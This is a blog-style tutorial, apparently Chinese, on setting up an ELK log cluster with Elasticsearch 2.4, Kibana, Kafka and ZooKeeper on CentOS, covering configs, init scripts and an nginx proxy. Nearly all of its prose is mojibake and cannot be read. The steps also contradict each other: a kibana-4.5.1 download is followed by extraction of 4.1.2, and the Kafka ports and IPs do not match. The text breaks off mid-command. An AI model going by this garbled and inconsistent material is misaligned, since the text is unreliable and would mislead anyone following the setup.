æ‰€ä»¥, éœ€è¦è‡³å°‘ 300/0.85=354g. å‡†å¤‡4å°æœºå™¨, åœ¨åŒä¸€ä¸ªå±€åŸŸç½‘å†…(å¯pingé€š), åˆ†åˆ«åœ¨æ¯å°æœºå™¨ä¸Šéƒ¨ç½²ç›¸åº”esèŠ‚ç‚¹, æ­å»ºä¸€å¥—æ—¥å¿—é›†ç¾¤. 4å°æœºå™¨, æœ€å°‘çš„èµ„æºäº†, ä½†æ˜¯æ²¡æ³•åšåˆ°é«˜å¯ç”¨, æ‰€ä»¥, è¿˜éœ€è¦å†åŠ ä¸€å°æœºå™¨, é˜²æ­¢è„‘è£‚, å…·ä½“è§æœ€å(ä¸¤å°ä¸»åŠ›æœºå™¨+ä¸€å°ç¨³å®šçš„æœºå™¨å°±è¡Œ) é›†ç¾¤èŠ‚ç‚¹: æœ€å°‘4å°æœºå™¨å†…å­˜: 8GåŠä»¥ä¸Šcpu: 4æ ¸åŠä»¥ä¸Šç¡¬ç›˜: 800GåŠä»¥ä¸Š, å»ºè®®1T, é›†ç¾¤å®¹é‡çº¦10äº¿çº§(å–å†³äºå¯¹åº”æ—¥å¿—å¤§å°)æ“ä½œç³»ç»Ÿ: centos å‡†å¤‡å·¥ä½œ: åº”ç”¨/ç½‘ç»œ ç¯å¢ƒSLBï¼š é˜¿é‡Œäº‘åšè´Ÿè½½å‡è¡¡&amp; æˆ–è€…è‡ªå·±æ­å»ºnginx ELKæœåŠ¡ç«¯é›†ç¾¤ï¼š ç³»ç»Ÿcentos 6.7 JDK1.8 ç‰ˆæœ¬ï¼šElasticsearch-2.4.0 es_01 10.47.88.206es_02 10.47.88.188 KibanaæœåŠ¡ç«¯é›†ç¾¤ï¼š ç³»ç»Ÿcentos 6.7 JDK1.8 ç‰ˆæœ¬ï¼škibana-4.5.1 es_01 10.47.88.206es_02 10.47.88.188 KafKaé›†ç¾¤ ç³»ç»Ÿcentos 6.7 JDK1.8 ç‰ˆæœ¬ï¼škafka_2.10-0.9 kafka_01 10.46.72.172kafka_02 10.47.88.103kafka_03 10.47.102.137 zookeeperé›†ç¾¤ ç³»ç»Ÿcentos 6.7 JDK1.8 ç‰ˆæœ¬ï¼šzookeeper-3.4.6 kafka_01 10.46.72.172kafka_02 10.47.88.103kafka_03 10.47.102.137 logstash-2.4 å®¢æˆ·ç«¯ï¼šç³»ç»Ÿcentos 6.7 JDK1.8 ç‰ˆæœ¬ï¼š logstash-2.4 tomcat-account_01: 10.27.232.85 éƒ½è¦jdk1.8æ”¯æŒã€‚ æ•´ä½“è¯´æ˜æ•°æ®æµå‘=&gt;æ—¥å¿—/æ¶ˆæ¯æ•´ä½“æµå‘logstash =&gt; kafka =&gt; logstash =&gt; elasticsearch =&gt; kibana éƒ¨ç½²1. ç¡®è®¤JDKç‰ˆæœ¬åŠå®‰è£…esä¾èµ–javaçš„ç‰ˆæœ¬æœ€å°ä¸º1.7 å¦‚æœç³»ç»Ÿä¸­æœªå®‰è£…JDKåˆ™å‘½ä»¤è¿”å›bash: java: command not found, éœ€è¦å®‰è£…JDK å¦‚æœç³»ç»Ÿä¸­å®‰è£…äº†JDK, éœ€ç¡®è®¤ç‰ˆæœ¬æ˜¯å¦å¤§äºjava 1.7, å¦åˆ™éœ€è¦å‡çº§ 123456789101112java -versionjava version \"1.7.0_51\" Java(TM) SE Runtime Environment (build 1.7.0_51-b13) Java HotSpot(TM) Server VM (build 24.51-b03, mixed mode)å®‰è£…åŠå‡çº§java(æ³¨æ„æ ¹æ®ç³»ç»Ÿä¸åŒè¿è¡Œå¯¹åº”å®‰è£…å‘½ä»¤)# Redhat/Centos/Fedorasudo yum install java-1.7.0-openjdkæˆ–è€…åˆ°å®˜ç½‘, ä¸‹è½½æœ€æ–°çš„jdkçš„rpmåŒ…, ç„¶åå®‰è£…wget http://download.oracle.com/otn-pub/java/jdk/8u91-b14/jdk-8u91-linux-x64.rpmrpm -Uvh jdk-8u91-linux-x64.rpm å†æ¬¡ç¡®è®¤å®‰è£…æˆåŠŸ 1java -version åŸºæœ¬é…ç½®è®¾ç½®FQDNï¼š12345678910111213141516171819#ä¿®æ”¹hostnamecat /etc/hostnamees_01#ä¿®æ”¹hostscat /etc/hosts127.0.0.1 localhost localhost.localdomain localhost4 localhost4.localdomain4::1 localhost localhost.localdomain localhost6 localhost6.localdomain610.47.88.206 es.ihaozhuo.com es_01#åˆ·æ–°ç¯å¢ƒhostname -F /etc/hostname#å¤æŸ¥ç»“æœhostname -fes.ihaozhuo.comhostnamees_01 é˜²ç«å¢™é…ç½®1234567891011#service iptables stop#setenforce 0ä¸è¿‡è¿™é‡Œæˆ‘é˜²ç«å¢™æ˜¯å¼€å¯çš„ï¼ŒåæœŸæ·»åŠ å‡ºå»ç«¯å£å³å¯ã€‚æˆ–è€…å¯ä»¥ä¸å…³é—­é˜²ç«å¢™ï¼Œä½†æ˜¯è¦åœ¨iptablesä¸­æ‰“å¼€ç›¸å…³çš„ç«¯å£ï¼š# vim /etc/sysconfig/iptables-A INPUT -m state --state NEW -m tcp -p tcp --dport 80 -j ACCEPT-A INPUT -m state --state NEW -m tcp -p tcp --dport 9200 -j ACCEPT-A INPUT -m state --state NEW -m tcp -p tcp --dport 9292 -j ACCEPT# service iptables restart RPMå¿«é€Ÿå®‰è£…elkæ‰€æœ‰å®‰è£…éƒ½å¯ä»¥ä½¿ç”¨rpmäºŒè¿›åˆ¶åŒ…çš„æ–¹å¼,å¢åŠ elasticå®˜ç½‘çš„ä»“åº“repoå°±å¯ä»¥ç”¨yumå®‰è£…äº† elasticsearchçœ‹è¿™é‡Œ â€”â€“ elasticsearch-rpmå®˜æ–¹æ–‡æ¡£ logstashçœ‹è¿™é‡Œ â€”-logstash-rpmå®˜ç½‘æ–‡æ¡£ kibanaçœ‹è¿™é‡Œ â€”kibana-rpmå®˜ç½‘æ–‡æ¡£ es_01æœåŠ¡ç«¯æºç å®‰è£…è¿™é‡Œæˆ‘æ˜¯æºç å®‰è£…çš„ä¸‹è½½ElasticSearch ElasticSearché»˜è®¤çš„å¯¹å¤–æœåŠ¡çš„HTTPç«¯å£æ˜¯9200ï¼ŒèŠ‚ç‚¹é—´äº¤äº’çš„TCPç«¯å£æ˜¯9300ã€‚ ä¸‹è½½åœ°å€ï¼šElasticsearch 2.4ç‰ˆæœ¬ï¼šElasticsearch2.4.3 1234567891011121314151617181920212223242526è§£å‹æºç åŒ…ï¼š[root@es_01 ~]# tar -zxvf elasticsearch-2.4.3.tar.gz -C /usr/local/ç„¶åç»™ç›®å½•åšä¸ªè½¯é“¾æ¥ï¼š[root@es_01 local]# ln -s /usr/local/elasticsearch-2.4.3/ /usr/local/elasticsearchè¿™é‡Œéœ€è¦ä¿®æ”¹é…ç½®æ–‡ä»¶ï¼šé…ç½®å‰å…ˆåˆ›å»ºå‡ ä¸ªç›®å½•æ–‡ä»¶æ–°å»ºç›®å½•, å‡è®¾/data/ç›®å½•æŒ‚è½½çš„ç¡¬ç›˜æœ€å¤§(500Gä»¥ä¸Š)[root@es_01 srv]]# mkdir /srv/data/es-data -p[root@es_01 srv]# mkdir /srv/data/es-work [root@es_01 local]# mkdir /usr/local/elasticsearch/logs[root@es_01 local]# mkdir /usr/local/elasticsearch/config/pluginsæ–°å»ºç”¨æˆ·ä¿®æ”¹æºç ç›®å½•å±æ€§å±ç»„ï¼š[root@es_01 elasticsearch]# useradd -s /sbin/nologin elasticsearch[root@es_01 elasticsearch]# chown -R elasticsearch:elasticsearch /usr/local/elasticsearch[root@es_01 elasticsearch]# chown -R elasticsearch:elasticsearch /srv/data/åˆ‡æ¢ç”¨æˆ·åˆ‡æ¢åˆ°elasticsearchç”¨æˆ·, å¹¶è¿›å…¥elasticsearchç›®å½•su elasticsearchcd /usr/local/elasticsearch/ é…ç½®Elasticsearchï¼šä»¥ç”¨æˆ·esçš„èº«ä»½è¿›è¡Œæ“ä½œ æ–‡ä»¶è·¯å¾„: config/elasticsearch.ymlä¿®æ”¹è¯¥æ–‡ä»¶ä¸­é…ç½®é¡¹: (æ³¨æ„, åŸå§‹æ–‡ä»¶ä¸­éƒ½æ˜¯è¢«#å·æ³¨é‡Šæ‰äº†, éœ€è¦å»æ‰å¯¹åº”æ³¨é‡Šå¹¶ä¿®æ”¹é…ç½®å€¼) é›†ç¾¤å: cluster.name, æ³¨æ„: ä¸¤å°æœºå™¨é…ç½®ä¸€è‡´ 1cluster.name: elk_cluster èŠ‚ç‚¹å: node.name, æ³¨æ„: ä¸¤å°æœºå™¨é…ç½®ä¸åŒ, ä¸€å°ä¸º01, å¦ä¸€å°ä¸º02 123456 # ç¬¬ä¸€å°æœºå™¨ node.name: inner_es_node_01# ç¬¬äºŒå°æœºå™¨node.name: inner_es_node_02 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647[root@es_01 config]# vim elasticsearch.yml# Use a descriptive name for your cluster:##cluster.name: elk_cluster## ------------------------------------ Node ------------------------------------## Use a descriptive name for the node:#node.name: es_01## Add custom attributes to the node:## node.rack: r1## ----------------------------------- Paths ------------------------------------## Path to directory where to store the data (separate multiple locations by comma):#path.data: /srv/data/es-data## Path to log files:#path.logs: /usr/local/elasticsearch/logs## ----------------------------------- Memory -----------------------------------## Lock the memory on startup:## bootstrap.memory_lock: true## Make sure that the `ES_HEAP_SIZE` environment variable is set to about half the memory# available on the system and that the owner of the process is allowed to use this limit.## Elasticsearch performs poorly when the system is swapping the memory.## ---------------------------------- Network -----------------------------------## Set the bind address to a specific IP (IPv4 or IPv6):#network.host: 10.47.88.206 åˆ‡æ¢åˆ°elasticsearchç”¨æˆ·å¯åŠ¨æœåŠ¡ã€‚ æºç å®‰è£…å¯åŠ¨éœ€è¦æ‰§è¡Œ ï¼š/usr/local/elasticsearch/bin/elasticsearch &amp;æ‰èƒ½å¯åŠ¨ï¼› æµ‹è¯•è®¿é—®æœåŠ¡æ­£å¸¸ï¼š1234567891011121314[elasticsearch@es_01 elasticsearch]$ curl http://10.47.88.206:9200&#123; \"name\" : \"es_01\", \"cluster_name\" : \"elk_cluster\", \"cluster_uuid\" : \"mspLZT5nTL-d124suNbBBQ\", \"version\" : &#123; \"number\" : \"2.4.3\", \"build_hash\" : \"d38a34e7b75af4e17ead16f156feffa432b22be3\", \"build_timestamp\" : \"2016-12-07T16:28:56Z\", \"build_snapshot\" : false, \"lucene_version\" : \"5.5.2\" &#125;, \"tagline\" : \"You Know, for Search\"&#125; ä¸‹é¢æ˜¯å†™å¼€æœºå¯åŠ¨è„šæœ¬ï¼Œä¸å†™çš„ç›´æ¥åˆ‡æ¢esç”¨æˆ·åˆ°ç›®å½•å¯åŠ¨ -dåå°å¯åŠ¨ã€‚è¿™é‡Œéœ€è¦/etc/init.d/åˆ›å»ºå¯åŠ¨è„šæœ¬ã€‚ 1234567891011121314151617181920212223242526[root@ELK ~]# git clone https://github.com/elastic/elasticsearch-servicewrapper.gitInitialized empty Git repository in /root/elasticsearch-servicewrapper/.git/remote: Counting objects: 184, done.remote: Total 184 (delta 0), reused 0 (delta 0), pack-reused 184Receiving objects: 100% (184/184), 4.55 MiB | 511 KiB/s, done.Resolving deltas: 100% (53/53), done.[root@ELK elasticsearch-servicewrapper]# mv service/ /usr/local/elasticsearch/bin/[root@ELK elasticsearch-servicewrapper]# cd /usr/local/elasticsearch[root@ELK elasticsearch]# /usr/local/elasticsearch/bin/service/elasticsearch install è¿™é‡Œæ˜¯å®‰è£…esDetected RHEL or Fedora:Installing the Elasticsearch daemon..[root@ELK elasticsearch]# vim /etc/init.d/elasticsearch æŸ¥çœ‹å®‰è£…eså¯åŠ¨é…ç½®æ–‡ä»¶[root@ELK elasticsearch]# service elastic search start å¯åŠ¨es Starting Elasticsearch...Waiting for Elasticsearch......running: PID:31360 æœåŠ¡å·²å¯åŠ¨äº†ã€‚å¯åŠ¨ç›¸å…³æœåŠ¡service elasticsearch startservice elasticsearch statusé…ç½® elasticsearch æœåŠ¡éšç³»ç»Ÿè‡ªåŠ¨å¯åŠ¨# chkconfig --add elasticsearchæµ‹è¯•ElasticSearchæœåŠ¡æ˜¯å¦æ­£å¸¸ï¼Œé¢„æœŸè¿”å›200çš„çŠ¶æ€ç # curl -X GET http://localhost:9200 es_02æœåŠ¡ç«¯èŠ‚ç‚¹ï¼šç¬¬ä¸€æ­¥åŸºç¡€é…ç½®éƒ½æ˜¯ä¸€æ ·çš„ï¼Œè·Ÿes_01èŠ‚ç‚¹ä¸€æ ·ã€‚ å…¶ä»–åªéœ€è¦åˆ°es_01æ‹·è´è¿‡æ¥,ç„¶ååˆ›å»ºä¸‹esç”¨æˆ·ï¼Œä¿®æ”¹ä¸‹é…ç½®ã€‚ 12345678910111213141516/usr/local/elasticsearch ç›®å½•æ‹·è´åˆ°es_02æœºå™¨ã€‚è¿™é‡Œéœ€è¦ä¿®æ”¹é…ç½®æ–‡ä»¶ï¼šé…ç½®å‰å…ˆåˆ›å»ºå‡ ä¸ªç›®å½•æ–‡ä»¶[root@es_01 srv]]# mkdir /srv/data/es-data -p[root@es_01 srv]# mkdir /srv/data/es-work ä¿®æ”¹æºç ç›®å½•å±æ€§å±ç»„ï¼š[root@es_01 elasticsearch]# useradd -s /sbin/nologin elasticsearch[root@es_01 elasticsearch]# chown -R elasticsearch:elasticsearch /usr/local/elasticsearch/*[root@es_01 elasticsearch]# chown -R elasticsearch:elasticsearch /srv/data/ä¿®æ”¹é…ç½®æ–‡ä»¶vim elasticsearch.ymlnode.name: es_02network.host: 10.47.88.188å…¶ä»–ä¸éœ€è¦ä¿®æ”¹ é›†ç¾¤èŠ‚ç‚¹es_02æµ‹è¯•ï¼š1234567891011121314[root@es_02 home]# curl http://10.47.88.188:9200&#123; \"name\" : \"es_02\", \"cluster_name\" : \"elk_cluster\", \"cluster_uuid\" : \"-4Rqn4IzS1GfnsodqZD8Tg\", \"version\" : &#123; \"number\" : \"2.4.3\", \"build_hash\" : \"d38a34e7b75af4e17ead16f156feffa432b22be3\", \"build_timestamp\" : \"2016-12-07T16:28:56Z\", \"build_snapshot\" : false, \"lucene_version\" : \"5.5.2\" &#125;, \"tagline\" : \"You Know, for Search\"&#125; elké›†ç¾¤å·²å®‰è£…é…ç½®å®Œæ¯•ï¼Œæˆ‘è¿™é‡Œé…ç½®äº†nginxåšä¸‹åå‘ä»£ç†ï¼Œèµ°80ç«¯å£å‡ºå»ã€‚ç„¶ååœ¨nginxè®¾ç½®ä¸‹å†…éƒ¨å…¬å¸è®¿é—®ä¸å¯¹å¤–å¼€æ”¾ã€‚ å®‰è£… headã€marvelã€bigdeskæ’ä»¶:es1.5æ’ä»¶å®‰è£…æ˜¯./plugin -install xxx,è€Œes2.4æ’ä»¶å®‰è£…æ²¡æœ‰å‡å·./plugin install xxx 1.5ç‰ˆæœ¬æ–¹æ³•ï¼š 1234567891011121314* headæ’ä»¶æ’ä»¶å®‰è£…æ–¹æ³•1ï¼š/usr/local/elasticsearch/bin/plugin -install mobz/elasticsearch-headé‡å¯es å³å¯ã€‚æ‰“å¼€http://localhost:9200/_plugin/head/æ’ä»¶å®‰è£…æ–¹æ³•2ï¼š1.https://github.com/mobz/elasticsearch-headä¸‹è½½zip è§£å‹2.å»ºç«‹/usr/local/elasticsearch/plugins/head/æ–‡ä»¶3.å°†è§£å‹åçš„elasticsearch-head-masteræ–‡ä»¶å¤¹ä¸‹çš„æ–‡ä»¶copyåˆ°/usr/local/elasticsearch/plugins/head/é‡å¯es å³å¯ã€‚æ‰“å¼€http://localhost:9200/_plugin/head/ 2.4ç‰ˆæœ¬ä»¥ä¸Šå®‰è£…ï¼š 1234567891011121314* headæ’ä»¶æ’ä»¶å®‰è£…æ–¹æ³•1ï¼š/usr/local/elasticsearch/bin/plugin install mobz/elasticsearch-headé‡å¯es å³å¯ã€‚æ‰“å¼€http://localhost:9200/_plugin/head/æ’ä»¶å®‰è£…æ–¹æ³•2ï¼š1.https://github.com/mobz/elasticsearch-headä¸‹è½½zip è§£å‹2.å»ºç«‹elasticsearch-1.0.0\\plugins\\head\\_siteæ–‡ä»¶3.å°†è§£å‹åçš„elasticsearch-head-masteræ–‡ä»¶å¤¹ä¸‹çš„æ–‡ä»¶copyåˆ°_siteé‡å¯es å³å¯ã€‚æ‰“å¼€http://localhost:9200/_plugin/head/ ä¸ºäº†ä¿éšœæœç´¢æœåŠ¡çš„ç¨³å®šæ€§ï¼Œå¢åŠ äº†ä¸€å°æœºå™¨ï¼Œå°†Elasticsearchéƒ¨ç½²æˆäº†é›†ç¾¤æ¨¡å¼ï¼Œ éƒ¨ç½²åˆ°ç”Ÿäº§ç¯å¢ƒæ—¶å‘ç°ï¼Œæ–°çš„èŠ‚ç‚¹å¹¶ä¸èƒ½è¢«å‘ç°ï¼Œåå°å‘ç°é˜¿é‡Œäº‘å¹¶ä¸æ”¯æŒå¤šæ’­ï¼Œæœ€ååªèƒ½æ”¹ä¸ºå•æ’­çš„æ–¹å¼é…ç½®äº†ï¼Œå¥½åœ¨ä¹‹åä¸€åˆ‡é¡ºåˆ©ã€‚ ä¸‹é¢é™„ä¸Šæµ‹è¯•ç¯å¢ƒé…ç½®ç¤ºä¾‹ï¼šæ·»åŠ ä¸‹ä¸‹é¢ç›‘å¬é›†ç¾¤IPå’Œç«¯å£ã€‚ es_01 1234[root@es_01 config]# vim elasticsearch.ymldiscovery.zen.ping.multicast.enabled: falsediscovery.zen.ping.unicast.hosts: [\"10.47.88.206:9300\",\"10.47.88.188:9300\"] es_02 1234[root@es_02 config]# vim elasticsearch.ymldiscovery.zen.ping.multicast.enabled: falsediscovery.zen.ping.unicast.hosts: [\"10.47.88.206:9300\",\"10.47.88.188:9300\"] ç„¶åé‡å¯æœåŠ¡ï¼ŒæŸ¥çœ‹é›†ç¾¤èŠ‚ç‚¹ã€‚ es_02å®‰è£…Kibana:123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118åˆ°https://www.elastic.co/downloads/kibana æ‰¾åˆé€‚çš„ç‰ˆæœ¬ã€‚wget https://download.elastic.co/kibana/kibana/kibana-4.5.1-linux-x64.tar.gz#è§£å‹ï¼ƒtar zxvf kibana-4.1.2-linux-x64.tar.gz -C /usr/local ï¼ƒcd /usr/local/ &amp;&amp; mv kibana-4.1.2-linux-x64 kibana#åˆ›å»ºkibanaå¯åŠ¨è„šæœ¬æœåŠ¡vi /etc/rc.d/init.d/kibana#!/bin/bash### BEGIN INIT INFO# Provides: kibana# Default-Start: 2 3 4 5# Default-Stop: 0 1 6# Short-Description: Runs kibana daemon# Description: Runs the kibana daemon as a non-root user### END INIT INFO# Process nameNAME=kibanaDESC=\"Kibana4\"PROG=\"/etc/init.d/kibana\"# Configure location of Kibana binKIBANA_BIN=/usr/local/kibana/bin# PID InfoPID_FOLDER=/var/run/kibana/PID_FILE=/var/run/kibana/$NAME.pidLOCK_FILE=/var/lock/subsys/$NAMEPATH=/bin:/usr/bin:/sbin:/usr/sbin:$KIBANA_BINDAEMON=$KIBANA_BIN/$NAME# Configure User to run daemon processDAEMON_USER=root# Configure logging locationKIBANA_LOG=/var/log/kibana.log# Begin ScriptRETVAL=0if [ `id -u` -ne 0 ]; then echo \"You need root privileges to run this script\" exit 1fi# Function library. /etc/init.d/functions start() &#123; echo -n \"Starting $DESC : \"pid=`pidofproc -p $PID_FILE kibana` if [ -n \"$pid\" ] ; then echo \"Already running.\" exit 0 else # Start Daemonif [ ! -d \"$PID_FOLDER\" ] ; then mkdir $PID_FOLDER fidaemon --user=$DAEMON_USER --pidfile=$PID_FILE $DAEMON 1&gt;\"$KIBANA_LOG\" 2&gt;&amp;1 &amp; sleep 2 pidofproc node &gt; $PID_FILE RETVAL=$? [[ $? -eq 0 ]] &amp;&amp; success || failureecho [ $RETVAL = 0 ] &amp;&amp; touch $LOCK_FILE return $RETVAL fi&#125;reload()&#123; echo \"Reload command is not implemented for this service.\" return $RETVAL&#125;stop() &#123; echo -n \"Stopping $DESC : \" killproc -p $PID_FILE $DAEMON RETVAL=$?echo [ $RETVAL = 0 ] &amp;&amp; rm -f $PID_FILE $LOCK_FILE&#125; case \"$1\" in start) start;; stop) stop ;; status) status -p $PID_FILE $DAEMON RETVAL=$? ;; restart) stop start ;; reload)reload;; *)# Invalid Arguments, print the following message. echo \"Usage: $0 &#123;start|stop|status|restart&#125;\" &gt;&amp;2exit 2 ;;esacä¿®æ”¹å¯åŠ¨æƒé™chmod +x /etc/rc.d/init.d/kibana é…ç½®Kibanaï¼š ç¼–è¾‘kibana.yaml ä¿®æ”¹ç«¯å£ï¼Œè®¾ç½®host å¯ä»¥è®¾ç½®æœ¬åœ°æœåŠ¡å™¨IP123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657vim /usr/local/kibana/config/kibana.yml# Kibana is served by a back end server. This controls which port to use.server.port: 5601# The host to bind the server to.server.host: \"10.47.88.188\"# If you are running kibana behind a proxy, and want to mount it at a path,# specify that path here. The basePath can't end in a slash.# server.basePath: \"\"# The maximum payload size in bytes on incoming server requests.# server.maxPayloadBytes: 1048576# The Elasticsearch instance to use for all your queries.elasticsearch.url: \"http://10.47.88.188:9200\"# preserve_elasticsearch_host true will send the hostname specified in `elasticsearch`. If you set it to false,# then the host you use to connect to *this* Kibana instance will be sent.elasticsearch.preserveHost: true# Kibana uses an index in Elasticsearch to store saved searches, visualizations# and dashboards. It will create a new index if it doesn't already exist.# kibana.index: \".kibana\"# The default application to load.kibana.defaultAppId: \"discover\"# If your Elasticsearch is protected with basic auth, these are the user credentials# used by the Kibana server to perform maintenance on the kibana_index at startup. Your Kibana# users will still need to authenticate with Elasticsearch (which is proxied through# the Kibana server)# elasticsearch.ssl.key: /path/to/your/client.key# If you need to provide a CA certificate for your Elasticsearch instance, put# the path of the pem file here.# elasticsearch.ssl.ca: /path/to/your/CA.pem# Set to false to have a complete disregard for the validity of the SSL# certificate.# elasticsearch.ssl.verify: true# Time in milliseconds to wait for elasticsearch to respond to pings, defaults to# request_timeout setting# elasticsearch.pingTimeout: 1500# Time in milliseconds to wait for responses from the back end or elasticsearch.# This must be &gt; 0elasticsearch.requestTimeout: 30000# Time in milliseconds for Elasticsearch to wait for responses from shards.# Set to 0 to disable.# elasticsearch.shardTimeout: 0 å¯åŠ¨kibanaæœåŠ¡12service kibana startservice kibana status æŸ¥çœ‹ç«¯å£12345678910netstat -nltp[root@es_02 config]# netstat -nltpActive Internet connections (only servers)Proto Recv-Q Send-Q Local Address Foreign Address State PID/Program nametcp 0 0 127.0.0.1:32000 0.0.0.0:* LISTEN 2517/javatcp 0 0 10.47.88.188:5601 0.0.0.0:* LISTEN 6474/nodetcp 0 0 10.47.88.188:10050 0.0.0.0:* LISTEN 305/zabbix_agentdtcp 0 0 10.47.88.188:9200 0.0.0.0:* LISTEN 5198/javatcp 0 0 10.47.88.188:9300 0.0.0.0:* LISTEN 5198/javatcp 0 0 0.0.0.0:22 0.0.0.0:* LISTEN 25265/sshd åˆ°æˆ‘Githubä¸Šé¢ä¸‹è½½kabanaå¯åŠ¨è„šæœ¬ã€‚ es_01æœºå™¨ä»es_02æœºå™¨æ‹·è´è¿‡å»ä¿®æ”¹ä¸‹é…ç½®å°±å¯ä»¥ã€‚ kibanaå®‰è£…æ’ä»¶å‚è€ƒï¼šInstalling Marvel è¿™é‡Œkibanaæˆ‘åšäº†nginxåå‘ä»£ç†ï¼Œé›†ç¾¤ä»£ç†ã€‚ nginxé…ç½®kibanaåå‘ä»£ç†ï¼šè¿™é‡Œæˆ‘åªå…è®¸æˆ‘å…¬å¸IPè®¿é—®ï¼š 1234567891011121314151617181920 upstream kibana.ihaozhuo.com &#123; server 10.47.88.206:5601 weight=1; server 10.47.88.188:5601 weight=1;&#125; server &#123; listen 80; server_name kibana.ihaozhuo.com; location / &#123; index index.html index.php index.jsp index.htm; allow 202.107.202.82/32; deny all; proxy_pass http://kibana.ihaozhuo.com; proxy_ignore_client_abort on; proxy_redirect off; proxy_set_header Host $host; proxy_set_header X-Real-IP $remote_addr; proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for; &#125; &#125;&#125; KafKaé›†ç¾¤æ­å»º123ä¸‹è½½åœ°å€ï¼šhttp://mirrors.hust.edu.cn/apache/kafka/0.9.0.0/kafka_2.10-0.9.0.0.tgz[root@kafka_01 srv]# tar -xvf kafka_2.10-0.9.0.0.tgz[root@kafka_01 srv]# mv kafka_2.10-0.9.0.0 kafka ä¿®æ”¹kafkaé…ç½®æ–‡ä»¶ 12345678910111213141516[root@kafka_01 config]# vim /srv/kafka/config/server.properties#è®¾ç½®brokeridï¼ˆä»0å¼€å§‹ï¼Œ3ä¸ªèŠ‚ç‚¹åˆ†åˆ«è®¾ä¸º0,1,2ï¼Œä¸èƒ½é‡å¤ï¼‰åœ¨è¿™é‡Œid=0è·Ÿzookeeper idè®¾ç½®ä¸€æ ·å°±è¡Œã€‚ é›†ç¾¤æœºå™¨ï¼šæŒ‰é¡ºåºå†™1broker.id=0 #è®¾ç½®dataç›®å½•ï¼Œæœ€å¥½ä¸è¦ç”¨é»˜è®¤çš„/tmp/kafka-logsmkdir -p /srv/kafka/data/kafka-logs #ä¿®æ”¹æœ¬åœ°IPåœ°å€ï¼šlisteners=PLAINTEXT://10.46.72.172:9092 log.dirs=/srv/kafka/data/kafka-logs#è®¾ç½®æ³¨å†Œåœ°å€ï¼ˆé‡è¦ï¼Œé»˜è®¤ä¼šæŠŠæœ¬æœºçš„hostanmeæ³¨å†Œåˆ°zkä¸­ï¼Œå®¢æˆ·ç«¯è¿æ¥æ—¶éœ€è¦è§£æè¯¥hostanmeï¼Œæ‰€ä»¥è¿™é‡Œç›´æ¥æ³¨å†Œæœ¬æœºçš„IPåœ°å€ï¼Œé¿å…hostnameè§£æå¤±è´¥ï¼ŒæŠ¥é”™java.nio.channels.UnresolvedAddressExceptionæˆ–java.io.IOException: Can not resolve addressï¼‰#è®¾ç½®zookeeperåœ°å€zookeeper.connect=10.46.72.172:2181,10.47.88.103:2181,10.47.102.137:2181 é…ç½®zookeeperåœ°å€ 1234567vim zookeeper.properties dataDir=/home/jollybi/tools/zookeeper-3.4.5/tmp# the port at which the clients will connectclientPort=2281# disable the per-ip limit on the number of connections since this is a non-production configmaxClientCnxns=0~ é…ç½®kafkaè®¿é—®åœ°å€ 1234567891011121314vim producer.properties metadata.broker.list=169.44.62.139:9292,169.44.59.138:9292,169.44.62.137:9292 # name of the partitioner class for partitioning events; default partition spreads data randomly#partitioner.class=# specifies whether the messages are sent asynchronously (async) or synchronously (sync)producer.type=sync# specify the compression codec for all data generated: none, gzip, snappy, lz4.# the old config values work as well: 0, 1, 2, 3 for none, gzip, snappy, lz4, respectivelycompression.codec=none# message encoderserializer.class=kafka.serializer.DefaultEncoder Kafkaå¸¸ç”¨å‘½ä»¤(æ™®åŠ)123456789101112131415161718192021222324Kafkaå¸¸ç”¨å‘½ä»¤ä»¥ä¸‹æ˜¯kafkaå¸¸ç”¨å‘½ä»¤è¡Œæ€»ç»“ï¼š 1.æŸ¥çœ‹topicçš„è¯¦ç»†ä¿¡æ¯ ./kafka-topics.sh -zookeeper 127.0.0.1:2181 -describe -topic testKJ1 2ã€ä¸ºtopicå¢åŠ å‰¯æœ¬ ./kafka-reassign-partitions.sh -zookeeper 127.0.0.1:2181 -reassignment-json-file json/partitions-to-move.json -execute 3ã€åˆ›å»ºtopic ./kafka-topics.sh --create --zookeeper localhost:2181 --replication-factor 1 --partitions 1 --topic testKJ1 4ã€ä¸ºtopicå¢åŠ partition ./bin/kafka-topics.sh â€“zookeeper 127.0.0.1:2181 â€“alter â€“partitions 20 â€“topic testKJ1 5ã€kafkaç”Ÿäº§è€…å®¢æˆ·ç«¯å‘½ä»¤ ./kafka-console-producer.sh --broker-list localhost:9092 --topic testKJ1 6ã€kafkaæ¶ˆè´¹è€…å®¢æˆ·ç«¯å‘½ä»¤ ./kafka-console-consumer.sh -zookeeper localhost:2181 --from-beginning --topic testKJ1 7ã€kafkaæœåŠ¡å¯åŠ¨ ./kafka-server-start.sh -daemon ../config/server.properties 8ã€ä¸‹çº¿broker ./kafka-run-class.sh kafka.admin.ShutdownBroker --zookeeper 127.0.0.1:2181 --broker #brokerId# --num.retries 3 --retry.interval.ms 60 shutdown broker 9ã€åˆ é™¤topic ./kafka-run-class.sh kafka.admin.DeleteTopicCommand --topic testKJ1 --zookeeper 127.0.0.1:2181 ./kafka-topics.sh --zookeeper localhost:2181 --delete --topic testKJ1 10ã€æŸ¥çœ‹consumerç»„å†…æ¶ˆè´¹çš„offset ./kafka-run-class.sh kafka.tools.ConsumerOffsetChecker --zookeeper localhost:2181 --group test --topic testKJ1 Kafkaç¾¤é›†æ–°å»ºä¸€ä¸ªTopicå«åšlogstash Topic 12345678910111213141516#æŸ¥çœ‹tocpicåˆ—è¡¨ï¼ˆ--zookeeperæŒ‡å®šä»»æ„ä¸€ä¸ªzkèŠ‚ç‚¹å³å¯ï¼Œç”¨äºè·å–é›†ç¾¤ä¿¡æ¯ï¼‰/usr/local/kafka/bin/kafka-topics.sh --zookeeper zk1.yazuoyw.com:2181 --describe #åˆ›å»ºtopicï¼ˆ--replication-factorè¡¨ç¤ºå¤åˆ¶åˆ°å¤šå°‘ä¸ªèŠ‚ç‚¹ï¼Œ--partitionsè¡¨ç¤ºåˆ†åŒºæ•°ï¼Œä¸€èˆ¬éƒ½è®¾ç½®ä¸º2æˆ–ä¸èŠ‚ç‚¹æ•°ç›¸ç­‰ï¼Œä¸èƒ½å¤§äºæ€»èŠ‚ç‚¹æ•°ï¼‰/usr/local/kafka/bin/kafka-topics.sh --zookeeper 